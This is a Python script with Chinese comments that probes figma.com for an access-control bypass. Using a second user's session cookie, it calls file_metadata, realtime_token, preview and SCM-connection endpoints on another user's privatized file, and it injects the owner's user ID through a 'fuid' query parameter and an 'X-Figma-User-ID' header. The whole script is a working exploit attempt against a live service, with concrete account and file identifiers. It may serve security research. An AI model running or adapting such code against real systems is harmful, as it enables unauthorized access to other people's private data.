# -*- coding: utf-8 -*-
"""fuid 参数注入验证: B cookie + fuid=A 参数访问已私有化的文件
假设: file_metadata/realtime_token 等接口的权限检查信任 URL fuid 参数
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
GIT_URL = ("https://api.figma.com/git/make/file/2386353361958857999/public/code/"
           "7e8f327c-edcf-45e4-a11a-2a3d85c686c3.git")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def load(path):
    return io.open(path, encoding='utf-8').read().strip().replace('\n', '; ')


BC = load('ws_cookie_B_new.txt')


def call(label, path, query=None, uid_hdr=None):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/make/" + A_MAKE, "Cookie": BC}
    if uid_hdr:
        headers["X-Figma-User-ID"] = uid_hdr
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:260]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:200]}")
        return e.code, raw


print("########## fuid 参数注入验证 (文件已私有化) ##########")
print("======== 1. file_metadata 带 fuid=A ========")
call("B ck + fuid=A", "/api/file_metadata/" + A_MAKE,
     query={"team_id": "1666382706663462213", "fuid": A_UID})
call("B ck + fuid=B", "/api/file_metadata/" + A_MAKE,
     query={"team_id": "1666382706663462213", "fuid": B_UID})
call("B ck 无参数", "/api/file_metadata/" + A_MAKE)

print("\n======== 2. realtime_token 带 fuid=A ========")
call("B ck + fuid=A", f"/api/files/{A_MAKE}/realtime_token", query={"fuid": A_UID})
call("B ck 无参数", f"/api/files/{A_MAKE}/realtime_token")

print("\n======== 3. generic_cached_preview 带 fuid=A ========")
call("B ck + fuid=A", f"/api/make/{A_MAKE}/11%3A13/generic_cached_preview",
     query={"git_repo_url": GIT_URL, "git_ref": "main", "fuid": A_UID})
call("B ck 无参数", f"/api/make/{A_MAKE}/11%3A13/generic_cached_preview",
     query={"git_repo_url": GIT_URL, "git_ref": "main"})

print("\n======== 4. scm/connections 带 fuid=A ========")
call("B ck + fuid=A", "/api/plans/cc6b6125-a07f-4d39-a54c-50ef65f33919/scm/connections",
     query={"ugit_url": GIT_URL, "fuid": A_UID})

print("\n======== 5. X-Figma-User-ID 头注入 ========")
call("B ck + X-UID=A", "/api/file_metadata/" + A_MAKE, uid_hdr=A_UID)
